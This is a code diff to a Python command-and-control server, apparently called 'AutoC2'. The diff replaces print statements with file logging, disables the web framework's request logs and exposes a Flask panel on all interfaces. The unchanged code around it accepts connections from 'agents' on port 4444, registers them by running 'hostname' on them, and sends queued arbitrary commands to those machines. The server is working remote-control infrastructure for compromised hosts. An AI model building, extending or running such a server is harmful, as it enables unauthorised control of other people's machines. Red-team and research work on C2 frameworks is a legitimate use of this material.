@@ -5,6 +5,7 @@ import socket
 import threading
 import queue
 import readline
+import logging
 
 # C2 Server IP and port configuration
 SERVER_HOST = "0.0.0.0"
@@ -13,6 +14,12 @@ SERVER_PORT = 4444
 # Flask stuff
 app = Flask(__name__)
 app.secret_key = "ac2_secret"
+log = logging.getLogger('werkzeug')
+log.disabled = True
+
+# Set up server logging
+logger = logging.getLogger(__name__)
+logging.basicConfig(filename='server.log', encoding='utf-8', format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)
 
 # Keep track of registered agents
 registered_addresses = set()
@@ -33,7 +40,7 @@ def handle_client(client_socket, client_address):
         try:
             # Get hostname
             command = "hostname" + "\n"
-            print(f"[+] Sending command to {client_address}: {command}")
+            logging.info(f"[+] New agent connected. Getting hostname...")
             client_socket.sendall(command.encode())
 
             # Receive output from the client until the delimiter
@@ -54,12 +61,11 @@ def handle_client(client_socket, client_address):
             curr_id += 1
             registered_agents_id.append(new_agent)
             registered_agents_ip[client_address[0]] = new_agent
-            print(f"[+] Registered new agent {new_agent.hostname} ({new_agent.ip})")
+            logger.info(f"[+] Registered new agent {new_agent.hostname} ({new_agent.ip})")
 
         except Exception as e:
-            print(f"[!] Error with client {client_address}: {e}")
+            logger.error(f"[!] Error with client {client_address}: {e}")
         finally:
-            print(f"[-] Connection closed for {client_address}")
             client_socket.close()
     else:
         try:
@@ -69,7 +75,7 @@ def handle_client(client_socket, client_address):
                 if not agent.command_queue.empty():
                     # Get the next command from the queue
                     command = agent.command_queue.get()
-                    print(f"[+] Sending command to {client_address}: {command}")
+                    logging.info(f"[+] Sending command to {client_address}: {command}")
                     client_socket.sendall(command.encode())
 
                     # Receive output from the client until the delimiter
@@ -86,9 +92,8 @@ def handle_client(client_socket, client_address):
                 else:
                     break
         except Exception as e:
-            print(f"[!] Error with client {client_address}: {e}")
+            logger.error(f"[!] Error with client {client_address}: {e}")
         finally:
-            print(f"[-] Connection closed for {client_address}")
             client_socket.close()
 
 def start_server():
@@ -97,20 +102,21 @@ def start_server():
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_socket.bind((SERVER_HOST, SERVER_PORT))
     server_socket.listen()
-    print(f"Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")
+
+    logger.info("[+] AutoC2 Server starting")
+    logger.info(f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}...")
 
     try:
         while True:
             # Accept a new client
             client_socket, client_address = server_socket.accept()
-            print(f"[+] Accepted connection from {client_address}")
             
             # Create a new thread to handle each client
             client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
             client_thread.daemon = True
             client_thread.start()
-    except KeyboardInterrupt:
-        print("\n[!] Shutting down the server.")
+    except Exception as e:
+        logger.info("\n[!] Shutting down the C2 server.")
     finally:
         server_socket.close()
 
@@ -185,5 +191,6 @@ if __name__ == '__main__':
     server_thread.start()
 
     # Run Flask in main thread
-    app.run()
+    logger.info("[+] Starting Flask app on 0.0.0.0:5000")
+    app.run(host='0.0.0.0', port=5000)
 
